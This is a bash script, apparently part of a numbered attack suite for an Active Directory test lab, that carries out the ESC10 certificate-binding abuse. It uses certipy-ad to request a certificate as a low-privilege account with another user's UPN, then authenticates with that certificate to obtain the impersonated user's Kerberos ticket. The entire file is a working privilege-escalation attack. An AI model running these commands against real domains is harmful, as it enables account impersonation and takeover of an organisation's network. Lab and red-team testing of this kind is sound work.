#!/bin/bash
# CONFIGURED — This is the only working ESC (CA operational for this attack)
source "$(dirname "$0")/../lib/cadre-env.sh"
source "$(dirname "$0")/../lib/common.sh"

start_attack "058" "ESC10 — Weak certificate binding + SIDHistory abuse"

require_tool certipy-ad

log "Step 1: Request certificate as analyst_dfir with chief_command UPN"
run_cmd "certipy-ad req -ca $CA_NAME -template User -upn chief_command@$DOMAIN_ROOT -u $ATTACK_USER@$DOMAIN_ROOT -p '$ATTACK_PASS' -dc-ip $DC01"
result $? "ESC10 — certificate request"

log "Step 2: Authenticate with issued certificate to recover chief_command TGT"
run_cmd "certipy-ad auth -pfx chief_command.pfx -dc-ip $DC01 -domain $DOMAIN_ROOT -username chief_command"
result $? "ESC10 — authentication with certificate"
